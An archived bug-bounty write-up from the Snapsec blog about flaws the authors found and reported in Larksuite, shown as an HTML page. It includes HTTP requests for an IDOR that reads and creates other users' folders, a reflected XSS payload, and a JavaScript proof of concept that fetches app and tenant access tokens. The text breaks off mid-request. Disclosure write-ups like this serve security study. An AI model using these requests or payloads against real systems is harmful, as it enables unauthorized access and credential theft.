@@ -1,0 +1,1236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script type="text/javascript" src="/_static/js/bundle-playback.js?v=HxkREWBo" charset="utf-8"></script>
+<script type="text/javascript" src="/_static/js/wombat.js?v=txqj7nKC" charset="utf-8"></script>
+<script>window.RufflePlayer=window.RufflePlayer||{};window.RufflePlayer.config={"autoplay":"on","unmuteOverlay":"hidden"};</script>
+<script type="text/javascript" src="/_static/js/ruffle/ruffle.js"></script>
+<script type="text/javascript">
+    __wm.init("https://web.archive.org/web");
+  __wm.wombat("https://snapsec.co/blog/hacking-larksuite/","20220716152713","https://web.archive.org/","web","/_static/",
+	      "1657985233");
+</script>
+<link rel="stylesheet" type="text/css" href="/_static/css/banner-styles.css?v=S1zqJCYt" />
+<link rel="stylesheet" type="text/css" href="/_static/css/iconochive.css?v=3PDvdIFv" />
+<!-- End Wayback Rewrite JS Include -->
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="stylesheet" href="https://web.archive.org/web/20220716152713cs_/https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css" integrity="" crossorigin="anonymous">
+	
+<script src="https://web.archive.org/web/20220716152713js_/https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="" crossorigin="anonymous"></script>
+<script src="https://web.archive.org/web/20220716152713js_/https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="" crossorigin="anonymous"></script>
+<script src="https://web.archive.org/web/20220716152713js_/https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js" integrity="" crossorigin="anonymous"></script>	
+<link rel="icon" href="/web/20220716152713im_/https://snapsec.co/blog/assets/images/logo.png">
+
+<title>We Hacked Larksuite For 1 month and Here is what we found | Snapsec | blog</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>We Hacked Larksuite For 1 month and Here is what we found | Snapsec Blog</title>
+<meta name="generator" content="Jekyll v3.9.2"/>
+<meta property="og:title" content="We Hacked Larksuite For 1 month and Here is what we found"/>
+<meta name="author" content="snapsec"/>
+<meta property="og:locale" content="en_US"/>
+<meta name="description" content="Almost a year back in March 2020 shuffling our private invites stock inorder to crash into a programme worthy of our time and excitement. In a while we stumbled upon a programme by name of Lark Technologies. Larksuite is basically a collaborrative platform where users can collaborate on various tasks. This product comprised of various interconnected services and functionalities and hence the name suite. The stats on the bugbounty page spoke that they were responsive and were unselfish with their bounties. All this was interesting and solidified the notion of choosing larksuite as our next target for some time to hack on. Choosing a programme/target only on above apparaent things can’t be an intelligent step one should take. So, we started exploring the target and we found enough reasons to deem it as our next target, as an example:"/>
+<meta property="og:description" content="Almost a year back in March 2020 shuffling our private invites stock inorder to crash into a programme worthy of our time and excitement. In a while we stumbled upon a programme by name of Lark Technologies. Larksuite is basically a collaborrative platform where users can collaborate on various tasks. This product comprised of various interconnected services and functionalities and hence the name suite. The stats on the bugbounty page spoke that they were responsive and were unselfish with their bounties. All this was interesting and solidified the notion of choosing larksuite as our next target for some time to hack on. Choosing a programme/target only on above apparaent things can’t be an intelligent step one should take. So, we started exploring the target and we found enough reasons to deem it as our next target, as an example:"/>
+<link rel="canonical" href="https://web.archive.org/web/20220716152713/https://snapsec.co/blog/hacking-larksuite/"/>
+<meta property="og:url" content="https://web.archive.org/web/20220716152713/https://snapsec.co/blog/hacking-larksuite/"/>
+<meta property="og:site_name" content="Snapsec Blog"/>
+<meta property="og:image" content="https://web.archive.org/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/main/LarkSuite.png"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2022-07-04T00:00:00+00:00"/>
+<meta name="twitter:card" content="summary_large_image"/>
+<meta property="twitter:image" content="https://snapsec.co/blog/assets/images/lark/main/LarkSuite.png"/>
+<meta property="twitter:title" content="We Hacked Larksuite For 1 month and Here is what we found"/>
+<script type="application/ld+json">
+{"@context":"https://web.archive.org/web/20220716152713/https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"snapsec"},"dateModified":"2022-07-04T00:00:00+00:00","datePublished":"2022-07-04T00:00:00+00:00","description":"Almost a year back in March 2020 shuffling our private invites stock inorder to crash into a programme worthy of our time and excitement. In a while we stumbled upon a programme by name of Lark Technologies. Larksuite is basically a collaborrative platform where users can collaborate on various tasks. This product comprised of various interconnected services and functionalities and hence the name suite. The stats on the bugbounty page spoke that they were responsive and were unselfish with their bounties. All this was interesting and solidified the notion of choosing larksuite as our next target for some time to hack on. Choosing a programme/target only on above apparaent things can’t be an intelligent step one should take. So, we started exploring the target and we found enough reasons to deem it as our next target, as an example:","headline":"We Hacked Larksuite For 1 month and Here is what we found","image":"https://web.archive.org/web/20220716152713/https://snapsec.co/blog/assets/images/lark/main/LarkSuite.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://web.archive.org/web/20220716152713/https://snapsec.co/blog/hacking-larksuite/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://web.archive.org/web/20220716152713/https://snapsec.co/blog/assets/images/logo.png"},"name":"snapsec"},"url":"https://web.archive.org/web/20220716152713/https://snapsec.co/blog/hacking-larksuite/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<link rel="stylesheet" href="https://web.archive.org/web/20220716152713cs_/https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="" crossorigin="anonymous">
+    
+<link href="/web/20220716152713cs_/https://snapsec.co/blog/assets/css/screen.css" rel="stylesheet">
+
+<link href="/web/20220716152713cs_/https://snapsec.co/blog/assets/css/main.css" rel="stylesheet">
+
+<script src="/web/20220716152713js_/https://snapsec.co/blog/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+<!-- change your GA id in _config.yml -->
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//web.archive.org/web/20220716152713/https://www.google-analytics.com/analytics.js','ga');
+ga('create', 'UA-208550451-1', 'auto');
+ga('send', 'pageview');
+</script>
+
+
+
+<body class="layout-post">
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://web.archive.org/web/20220716152713cs_/https://fonts.googleapis.com/css?family=Righteous%7CMerriweather:300,300i,400,400i,700,700i" rel="stylesheet">
+		<link rel="stylesheet" href="https://web.archive.org/web/20220716152713cs_/https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Menu Navigation
+================================================== -->
+<nav class="navbar navbar-expand-lg navbar-light bg-white fixed-top mediumnavigation nav-down">
+
+    <div class="container pr-0">
+
+    <!-- Begin Logo -->
+    <a class="navbar-brand" href="/web/20220716152713/https://snapsec.co/blog/">
+    <img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/logo.png" alt="Snapsec | blog">
+    </a>
+    <!-- End Logo -->
+
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarMediumish" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+    </button>
+
+    <div class="collapse navbar-collapse" id="navbarMediumish">
+
+        <!-- Begin Menu -->
+
+            <ul class="navbar-nav ml-auto">
+
+                
+                <li class="nav-item">
+                
+                <a class="nav-link" href="/web/20220716152713/https://snapsec.co/blog/index.html">Blog</a>
+                </li>
+		    
+             <li class="nav-item">
+                <a class="nav-link" href="https://web.archive.org/web/20220716152713/https://snapsec.co/blog">Short Stories</a>
+                </li>
+
+                <li class="nav-item">
+                <a class="nav-link" href="https://web.archive.org/web/20220716152713/https://snapsec.co/#contact">Contact-Us</a>
+                </li>
+		    
+		 <li class="nav-item">
+                <a class="nav-link" href="https://web.archive.org/web/20220716152713/https://snapsec.co/work.html">Our Work</a>
+                </li>
+
+    
+
+       
+
+                <script src="/web/20220716152713js_/https://snapsec.co/blog/assets/js/lunr.js"></script>
+
+
+<style>
+    .lunrsearchresult .title {color: #d9230f;}
+    .lunrsearchresult .url {color: silver;}
+    .lunrsearchresult a {display: block; color: #777;}
+    .lunrsearchresult a:hover, .lunrsearchresult a:focus {text-decoration: none;}
+    .lunrsearchresult a:hover .title {text-decoration: underline;}
+</style>
+
+
+<form class="bd-search" onsubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+    <input type="text" class="form-control text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
+</form>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/web/20220716152713js_/https://snapsec.co/blog/assets/js/lunrsearchengine.js"></script>
+
+            </ul>
+
+        <!-- End Menu -->
+
+    </div>
+
+    </div>
+</nav>
+<!-- End Navigation
+================================================== -->
+
+<div class="site-content">
+
+<div class="container">
+
+<!-- Site Title
+================================================== -->
+<div class="mainheading">
+    <h1 class="sitetitle">Snapsec | blog</h1>
+    <p class="lead">
+        Snapsec - A cybersecurity Company.
+    </p>
+</div>
+
+<!-- Content
+================================================== -->
+<div class="main-content">
+    <!-- Begin Article
+================================================== -->
+<div class="container">
+    <div class="row">
+
+        <!-- Post Share -->
+        <div class="col-md-2 pl-0">
+            <div class="share sticky-top sticky-top-offset">
+    <p>
+        Share
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://web.archive.org/web/20220716152713/https://twitter.com/intent/tweet?text=We Hacked Larksuite For 1 month and Here is what we found&amp;url=https://snapsec.co/blog/hacking-larksuite/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://web.archive.org/web/20220716152713/https://facebook.com/sharer.php?u=https://snapsec.co/blog/hacking-larksuite/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+                <i class="fab fa-facebook-f"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://web.archive.org/web/20220716152713/https://www.linkedin.com/shareArticle?mini=true&amp;url=https://snapsec.co/blog/hacking-larksuite/" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-linkedin-in"></i>
+            </a>
+        </li>
+
+    </ul>
+    
+    <div class="sep">
+    </div>
+    <ul>
+        <li>
+        <a class="small smoothscroll" href="#disqus_thread"></a>
+        </li>
+    </ul>
+    
+</div>
+
+        </div>
+
+        <!-- Post -->
+        
+
+        <div class="col-md-9 flex-first flex-md-unordered">
+            <div class="mainheading">
+
+                <!-- Author Box -->
+                
+                <div class="row post-top-meta">
+                    <div class="col-xs-12 col-md-3 col-lg-2 text-center text-md-left mb-4 mb-md-0">
+                        
+                        <img class="author-thumb" src="https://web.archive.org/web/20220716152713im_/https://www.gravatar.com/avatar/d84e5349885a30ac2d2deaac48a94692?s=250&amp;d=mm&amp;r=x" alt="Snapsec">
+                        
+                    </div>
+                    <div class="col-xs-12 col-md-9 col-lg-10 text-center text-md-left">
+                        <a target="_blank" class="link-dark" href="https://web.archive.org/web/20220716152713/https://snapsec.co/blog">Snapsec</a><a target="_blank" href="https://web.archive.org/web/20220716152713/https://twitter.com/snap_sec" class="btn follow">Follow</a>
+                        <span class="author-description">A Cybersecurity and a Penetration Testing Company.</span>
+                    </div>
+                </div>
+                
+
+                <!-- Post Title -->
+                <h1 class="posttitle">We Hacked Larksuite For 1 month and Here is what we found</h1>
+
+            </div>
+
+            <!-- Adsense if enabled from _config.yml (change your pub id and slot) -->
+            
+            <!-- End Adsense -->
+
+            <!-- Post Featured Image -->
+            
+
+            
+            <img class="featured-image img-fluid" src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/main/LarkSuite.png" alt="We Hacked Larksuite For 1 month and Here is what we found">
+            
+
+            
+            <!-- End Featured Image -->
+
+            <!-- Post Content -->
+            <div class="article-post">
+                <!-- Toc if any -->
+                
+                <!-- End Toc -->
+                <p>Almost a year back in March 2020 shuffling our private invites stock inorder to crash into a programme worthy of our time and excitement. In a while we stumbled upon a programme by name of <strong>Lark Technologies</strong>. Larksuite is basically a <em>collaborrative platform</em> where users can collaborate on various tasks. This <em>product comprised of various interconnected services and functionalities</em> and hence the name <em>suite</em>. The stats on the bugbounty page spoke that they were <em>responsive and were unselfish</em> with their bounties. All this was interesting and solidified the notion of choosing <em>larksuite</em> as our next target for some time to hack on. Choosing a <em>programme/target only on above apparaent things</em> can’t be an intelligent step one should take. So, we started exploring the <em>target</em> and we found enough reasons to deem it as our next target, as an example:</p>
+
+<ul>
+  <li>
+    <p><strong>Bigger application size of Larksuite</strong>: This in simple terms means a <strong>larger attack surface</strong>, <em>more depth</em> and <em>less burnouts</em>. With respect to above <em>programme</em> it provided various services like <em>messenger, meetings, calendars, email services, docs and cloud storage</em> .</p>
+  </li>
+  <li>
+    <p><strong>Complicated Access controls were implemented</strong> : This is something we can hardly resist from testing, being specialized in <em>testing access controls</em> this was one of our strongest cues. Larksuite implemented various <strong>RBAC (Role based access controls)</strong>  in the application meaning there were exclusive <em>permission sets</em> for specific roles in the <em>organization</em>.</p>
+  </li>
+  <li>
+    <p><strong>File management and sharing systems</strong> :  One of the <em>fun and interesting</em> feature to exploit and fiddle with. Larksuite <em>implemented file sharing systems</em> in their product as well which allowed users to <strong>upload and share various files and documents</strong> and they could also <em>edit/create new versions of those files</em>.</p>
+  </li>
+</ul>
+
+<p>These were a some of the principal points on basis of which we were very excited to dive deep into different products offered by larksuite.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>The rule of thumb when it comes to hacking any target is to know it well and collect as much as information as you can.</p>
+
+<blockquote>
+  <p>If you give a hacker a new toy, the first thing he’ll do is take it apart to figure out how it works. — Jamie Zawinski</p>
+</blockquote>
+
+<p>Reconnaissance is a set of processes and techniques used to covertly discover and collect information about a target system. In the reconnaissance stage, attackers act like detectives, gathering information to truly understand their target. If you think <em>Recon is only</em> the process of the running a set of tools blindly while watcing the <em>flashing clolors</em>  with your arms <em>crossed</em>, then you need to rethink the <em>process of recon</em>. Or you are going to know a different kind of recon in this section.</p>
+
+<p>Prior to running tools and gathering data our recon comprises of <strong>Reading product documenatation, checking their youtube channels, third party product walkthroughs and tutorials. webinars etc</strong>. We will be briefly describing the mentioned approaches in our <em>Recon process</em>.</p>
+
+<ul>
+  <li>
+    <p><strong>Reading Product documentation</strong>: These are one of the accurate and simplified resources you can get your hands on. They are built or documented for the users/customers of this application and the’ve simplified it to the level that anyone can understand it. The perks of reading this documentation that <em>you get to understand</em> the application from a <em>user’s perspective</em> and all of the <em>features get revealed to you</em>, their use and dependence. Moreover the logic of the application gets clear to you. We spent a few days reading the documentation and using the application as <em>simple users</em> and meanwhile if any test case came to our mind we just noted it down.</p>
+  </li>
+  <li>
+    <p><strong>Browsing their youtube channels</strong> :  In this case we <em>visited the official channel of larksuite</em>  which is under the name of <em>Lark</em> on youtube, there was again a treasure of information. Step by step tutorials explaining difficult features, in other words it is visual docementation of the product. We went through almost all of the Videos thoroughly and it sedimented the <em>understanding of product</em> and we were able to understand it better.</p>
+
+    <blockquote>
+      <p>Lark youtube Channel : <a href="https://web.archive.org/web/20220716152713/https://www.youtube.com/c/Larksuite/videos">https://www.youtube.com/c/Larksuite/videos</a></p>
+    </blockquote>
+  </li>
+  <li>
+    <p><strong>Reading about product from third party resources</strong> : One of the prime benefit of reading from <em>third party resources</em> the <em>product information and one’s user knowledge</em> get diversified and sometimes you can <em>know the issues or errors</em> from those resources which can be <em>directly abused</em> and you can have easy bugs.</p>
+  </li>
+  <li>
+    <p><strong>Product helpdesk and community support</strong>: People have always listed their typical queries and concerns on these platforms and the companies have answered them. We read the queries as well so that we can grasp some typical issues faced by maximum users and look into them if they can be abused.</p>
+  </li>
+</ul>
+
+<p>During the process we came to know that larksuite has 4 different main products:</p>
+
+<ul>
+  <li><strong>Messenger:</strong> Is an integrated Messenger which allows team members to chat, Send file and more anywhere within the larksuite.</li>
+  <li><strong>Calenders:</strong> Connected Calenders are used to Schedule Meeting, Keep track of Events and more. (Imagine this of a google calender).</li>
+  <li><strong>Docs:</strong> Is a file sharing service, It allow team members to upload, Edit, Create, Delete, Version Tracking, and Share files with other members.</li>
+  <li><strong>Video Conferencing:</strong> Is a service which allow team members to perform video/audio groups calls with other team members.</li>
+</ul>
+
+<p>and all of these products had a tons and tons of features for us to test.</p>
+
+<p>Surely our recon doesn’t end here but this forms the <em>fundamentals</em> of our recon to any <em>organization or target</em> we choose to hack.</p>
+
+<h2 id="vulnerabilities-discovered">Vulnerabilities Discovered</h2>
+
+<p>Although we cannot write and publish about every vulnerability we found, because we have found alot of them and some of those them are still in traige or unresolved state, But here are some of the most interesting/Fixed ones.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>ID</th>
+      <th>Title</th>
+      <th>Severity</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>Accessing/Editing Folders of Other Users in the Orginisation</td>
+      <td>High</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>Stealing app credentials by reflected xss on Lark Suite</td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>Privilege Escalation to All-staff group (editing/accessing/deleting All-staff group)</td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td>IDOR - Access to private file’s and Tickets of helpdesk.</td>
+      <td>High</td>
+    </tr>
+    <tr>
+      <td>5</td>
+      <td>Viewer is able to leak the previous versions of the file</td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td>6</td>
+      <td>User without permission can download file’s even if it’s restricted.</td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td>7</td>
+      <td>DOM based open redirect leads to XSS on larksuite.com using /?back_uri= parameter</td>
+      <td>High</td>
+    </tr>
+    <tr>
+      <td>8</td>
+      <td>IDOR allows viewer to delete bin’s files of Admin</td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td>9</td>
+      <td>Access to private file’s of other users in helpdesk conversation</td>
+      <td>High</td>
+    </tr>
+    <tr>
+      <td>10</td>
+      <td>Sub-Dept User Can Add User’s To Main Department</td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td>11</td>
+      <td>Auto approving own apps from a lower level role leading to mass privilege escalations</td>
+      <td>High</td>
+    </tr>
+    <tr>
+      <td>12</td>
+      <td>Attacker can join any tenant on larksuite and view personal files/chats.</td>
+      <td>Critical</td>
+    </tr>
+    <tr>
+      <td>13</td>
+      <td>No Csrf protection against sending invitation to join the team.</td>
+      <td>High</td>
+    </tr>
+    <tr>
+      <td>14</td>
+      <td>Low privileged user is abel to access the Admin log</td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td>15</td>
+      <td>Viewing comments on files and documents.</td>
+      <td>Medium</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br/><br/></p>
+
+<h4 id="accessing-and-editing-other-users-folders-in-the-organization">Accessing and Editing other users folders in the organization</h4>
+
+<p>We Started with their access control model which included the tons of permission on each level and just after spending few hours we found that Lark-suite allows Super-admins to invite other admin’s/users. The invited users are allowed to view/modify their folders in the lark app. But we found a Security issue which allows other users to view/modify directory structure of other users in the organisation, without having any access on those files.</p>
+
+<p><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/1/1.png" alt="1"/></p>
+
+<p>Once <em>Super Admin</em> added another user he was only able to <em>access the company information</em> but he lacked access on the <em>files and directories</em> of other members. On digging a bit we found a <em>GET Request</em> which takes user id in a parameter and <em>returns the directories and tokens of that user</em> in the response.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="nf">GET</span>  <span class="nn">/suite/admin/space_manage/user_folder?userID=6782777787976515850</span>  <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">unzftv7n88.larksuite.com</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">X-Timezone-Offset</span><span class="p">:</span> <span class="s">600</span>
+<span class="na">X-Csrf-Token</span><span class="p">:</span> <span class="s">[Value]</span>
+<span class="na">credentials</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Cookie</span><span class="p">:</span><span class="s">[Value]</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/1/2.png" alt="1"/></p>
+
+<p>On the above request we appended another token in the <em>parameter query</em> and added a <em>parentToken</em> and we gave its <em>value</em> as the <em>user’s folder token</em> we got in the response of the above request. Request looks something like this:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="nf">GET</span>  <span class="nn">/suite/admin/space_manage/user_folder?userID=[UserId]&amp;parentToken=[PToken]</span>  <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">unzftv7n88.larksuite.com</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">X-Timezone-Offset</span><span class="p">:</span> <span class="s">600</span>
+<span class="na">X-Csrf-Token</span><span class="p">:</span> <span class="s">[Value]</span>
+<span class="na">credentials</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Cookie</span><span class="p">:</span><span class="s">[Value]</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>The response of this request returned us all of the <em>files</em> inside that parent directory as well as the unique <code class="language-plaintext highlighter-rouge">token</code> of each file inside that directory, these Tokens could be later used to download the whole file using this endpoint <code class="language-plaintext highlighter-rouge">https://internal-api-space.larksuite.com/space/api/box/stream/download/all/[token]/</code></p>
+
+<p><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/1/3.png" alt="1"/></p>
+
+<p>Moving a step further, we tried if we can <em>create new files</em> inside that <em>folder</em> and enquiring a bit we found a <em>below http request</em> was used to create new folders in a <em>directory</em></p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="nf">POST</span>  <span class="nn">/suite/admin/space_manage/user_folder</span>  <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">unzftv7n88.larksuite.com</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">X-Timezone-Offset</span><span class="p">:</span> <span class="s">600</span>
+<span class="na">X-Csrf-Token</span><span class="p">:</span> <span class="s">[Value]</span>
+<span class="na">credentials</span><span class="p">:</span> <span class="s">same-origin</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Cookie</span><span class="p">:</span><span class="s">[Value]</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>We used the <em>leaking directory tokens</em> in this request and response was <strong>200 ok</strong> and upon confirmation we found <em>new sub directory</em> was created in that folder.</p>
+
+<p><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/1/4.png" alt="1"/></p>
+
+<hr/>
+
+<h4 id="stealing-app-credentials-using-reflected-xss-on-larksuite">Stealing App Credentials Using Reflected XSS On LarkSuite</h4>
+
+<p>A reflected cross-site scripting (XSS) vulnerability was found on a Lark Suite endpoint via the ‘next’ parameter which an attacker could
+potentially use to obtain app credentials (must first know the app ID) of any larksuite user.</p>
+
+<p>Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way. Such was the case here on this following endpoint <code class="language-plaintext highlighter-rouge">https://open.larksuite.com/officialapp/cli_9c4cd0ee44b81106/url/callback?next=&lt;script&gt;alert('snapsec')&lt;/script&gt;</code>, The callback parameter was being reflected in the context of <code class="language-plaintext highlighter-rouge">open.larksuite.com</code> and hence allowed us to perform an XSS attack.</p>
+
+<p>As far our understanding of lark applications, <code class="language-plaintext highlighter-rouge">open.larksuite.com</code> was a pretty intresting target. We couldn’t perform any direct impact of the user account since there are very limited endpoints and functionalities hosted under <code class="language-plaintext highlighter-rouge">open.larksuite.com</code>, One of the features that caught our attention was the <code class="language-plaintext highlighter-rouge">Application</code>.</p>
+
+<p>In larksuite while creating an app, an admin can provide a set of Permission to the App which would allow the app to have access to Lark Teams, Chats, Files and much more and we decided to prove its impact by stealing the application credentials of a victim which could be  used for further privilege escalation.</p>
+
+<p>To do that we wrote the quick Javascript function , Which extracts user information from the Larksuite app, and hence allowed us to extract the following information about the apps:</p>
+
+<ul>
+  <li>app_access_token</li>
+  <li>app_access_token</li>
+  <li>tenant_access_token</li>
+  <li>tenant_access_token</li>
+  <li>and more…</li>
+</ul>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre><span class="kd">function</span> <span class="nx">AppGrabber</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https:</span><span class="se">\</span><span class="s2">/</span><span class="se">\</span><span class="s2">/open.larksuite.com</span><span class="se">\</span><span class="s2">/api</span><span class="se">\</span><span class="s2">/v3</span><span class="se">\</span><span class="s2">/app/</span><span class="se">\</span><span class="s2">cli_9eb747e4557e9106</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Accept</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application</span><span class="se">\</span><span class="s2">/json</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Accept-Language</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">en-US,en;q=0.5</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">content-type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application</span><span class="se">\</span><span class="s2">/json; charset=utf-8</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">{"Body":{},"Head":{}}</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+<span class="nx">alert</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">response</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="p">}</span>
+<span class="p">}</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<blockquote>
+  <p>The extracted information could later be used to extract more information about the target orginisation.</p>
+</blockquote>
+
+<hr/>
+<h4 id="privilege-escalation-from-only-view-company-info-to-adding-and-removing-staff-members">Privilege escalation from only view company info to adding and removing staff members.</h4>
+
+<p>In this case Lark-suite allowed admins to invite other admin’s with the specific permissions. There was a <em>specific permission set</em> which comprised of various permissions and among them admin can specify the <em>permissions with which he wants users on board</em>.</p>
+
+<p>In this case <em>we added a user with only</em> view company information as shown in this image.</p>
+
+<p><img src="/web/20220716152713im_/https://snapsec.co/blog/assets/images/lark/2/1.png" alt="1"/></p>
+
+<p>We gave the new user these(company info) permission and restricted him from other permissions available, which means he should not be able to access other but we managed to figure out that an invited admin with limited priveleges can still Edit/Access/Delete All-staff group in the organisation.</p>
+
+<p>We sent this <code class="language-plaintext highlighter-rouge">http</code> request and returned us the <em>data of the</em> all of the groups and <em>unauthorized user was abel to access All staff groups information</em>.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
